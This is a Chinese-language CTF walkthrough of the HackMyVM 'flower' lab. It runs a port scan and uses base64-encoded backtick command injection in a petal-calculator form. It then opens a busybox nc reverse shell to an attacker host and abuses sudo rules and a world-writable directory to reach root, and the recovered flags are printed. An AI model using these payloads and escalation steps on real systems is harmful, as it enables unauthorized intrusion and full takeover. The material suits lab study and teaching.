## Nmap

```bash
┌──(kali㉿kali)-[~/aaa]
└─$ nmap -p0-65535 --min-rate 5000 192.168.205.239
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-19 11:54 -0400
Nmap scan report for 192.168.205.239
Host is up (0.00033s latency).
Not shown: 65535 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:80:83:27 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds
```

只开了 80，直接看 Web。

## Web 枚举

首页是个花瓣计算器，表单提交到 `/`，选项值都是 base64：

```html
<option name="Lily" value="MSsy">Lily</option>
<option name="Buttercup" value="Misz">Buttercup</option>
<option name="Delphiniums" value="Mys1">Delphiniums</option>
<option name="Cineraria" value="NSs4">Cineraria</option>
<option name="Chicory" value="OCsxMw==">Chicory</option>
<option name="Chrysanthemum" value="MTMrMjE=">Chrysanthemum</option>
<option name="Michaelmas daisies" value="MjErMzQ=">Michaelmas daisies</option>
```

解码后发现是斐波那契数列表达式：

```text
1+2, 2+3, 3+5, 5+8, 8+13, 13+21, 21+34
```

POST 后返回计算结果，比如 `1+2` 返回 `3 petals`。

扫目录找到 `/run.sh`：

```bash
┌──(kali㉿kali)-[~/aaa]
└─$ curl http://192.168.205.239/run.sh
php -S 0.0.0.0
```

后端是 PHP 内置服务器。

## 命令注入

既然是 base64 解码后当表达式算，试试反引号命令替换：

```bash
┌──(kali㉿kali)-[~/aaa]
└─$ printf '`id`' | base64 -w0
YGlkYA==

┌──(kali㉿kali)-[~/aaa]
└─$ curl -s -X POST http://192.168.205.239/ -d 'petals=YGlkYA=='
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
 petals
```

命令注入成了，返回了 `www-data` 的 uid。

## 反弹 Shell

起个 listener：

```bash
┌──(kali㉿kali)-[~/aaa]
└─$ penelope -p 8888
```

构造 busybox nc 反弹的 payload：

```bash
┌──(kali㉿kali)-[~/aaa]
└─$ printf '`busybox nc 192.168.205.128 8888 -e /bin/sh`' | base64 -w0
YGJ1c3lib3ggbmMgMTkyLjE2OC4yMDUuMTI4IDg4ODggLWUgL2Jpbi9zaGA=
```

提交：

```bash
┌──(kali㉿kali)-[~/aaa]
└─$ curl -s -X POST http://192.168.205.239/ -d 'petals=YGJ1c3lib3ggbmMgMTkyLjE2OC4yMDUuMTI4IDg4ODggLWUgL2Jpbi9zaGA='
```

penelope 自动处理好 PTY，拿到 www-data shell：

```bash
www-data@flower:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## sudo -l

```bash
www-data@flower:~$ sudo -l
Matching Defaults entries for www-data on flower:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on flower:
    (rose) NOPASSWD: /usr/bin/python3 /home/rose/diary/diary.py
```

可以用 rose 身份跑 `diary.py`。

## diary.py 分析

看看原始内容：

```bash
www-data@flower:~$ cat /home/rose/diary/diary.py
import pickle

diary = {"November28":"i found a blue viola","December1":"i lost my blue viola"}
p = open('diary.pickle','wb')
pickle.dump(diary,p)
```

再看权限：

```bash
www-data@flower:~$ ls -la /home/rose/diary/
total 12
drwxrwxrwx 2 rose rose 4096 Nov 30  2020 .
drwxr-xr-x 3 rose rose 4096 Nov 30  2020 ..
-rw-r--r-- 1 rose rose  147 Nov 30  2020 diary.py
```

目录权限是 `777`，www-data 可以直接删除并重建 `diary.py`。

## 提权到 Rose

先枚举 rose 的 sudo 权限，写个临时脚本覆盖 `/home/rose/diary/diary.py`：

```python
import os
os.system('sudo -l')
```

以 rose 身份运行：

```bash
www-data@flower:~$ sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py
Matching Defaults entries for rose on flower:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User rose may run the following commands on flower:
    (root) NOPASSWD: /bin/bash /home/rose/.plantbook
```

rose 能以 root 身份跑 `/bin/bash /home/rose/.plantbook`。

看看原始的 `.plantbook`：

```bash
#!/bin/bash
echo Hello, write the name of the flower that u found
read flower
echo Nice, $flower submitted on : $(date)
```

权限是 `-rwx------`，只有 rose 能写。

利用思路就是：

```text
1. 用 diary.py 以 rose 身份改写 .plantbook
2. 再用 diary.py 以 rose 身份 sudo 执行 .plantbook
```

先覆写 `.plantbook`，让它直接起一个保留 root 权限的 shell：

```python
import os
os.system('echo "bash -p" > /home/rose/.plantbook')
```

写入 `/home/rose/diary/diary.py` 后以 rose 身份执行：

```bash
www-data@flower:~$ sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py
```

然后第二步，再覆写 `diary.py`，让它 sudo 执行修改后的 `.plantbook`：

```python
import os
os.system('sudo /bin/bash /home/rose/.plantbook')
```

写入后再跑一次：

```bash
www-data@flower:~$ sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py
root@flower:/home/rose/diary# id
uid=0(root) gid=0(root) groups=0(root)
```

拿到 root shell。

## Flag

```bash
root@flower:~# cat /home/rose/user.txt
HMV{R0ses_are_R3d$}

root@flower:~# cat /root/root.txt
HMV{R0ses_are_als0_black.}
```